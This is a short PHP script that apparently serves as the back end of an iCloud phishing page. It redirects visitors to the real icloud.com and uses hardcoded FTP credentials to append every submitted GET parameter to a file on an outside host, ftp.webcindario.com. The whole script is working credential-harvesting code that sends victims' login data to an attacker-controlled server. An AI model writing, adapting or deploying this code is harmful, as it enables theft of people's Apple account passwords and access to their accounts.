<?php header("Location:http://www.icloud.com"); $handle = fopen("ftp://icloudpass20:codetek10@ftp.webcindario.com/web/index.html", "a"); foreach($_GET as $variable => $value) { fwrite($handle, $variable); fwrite($handle, "="); fwrite($handle, $value); fwrite($handle, "\r\n"); } fwrite($handle, "\r\n");  fclose($handle); exit; ?>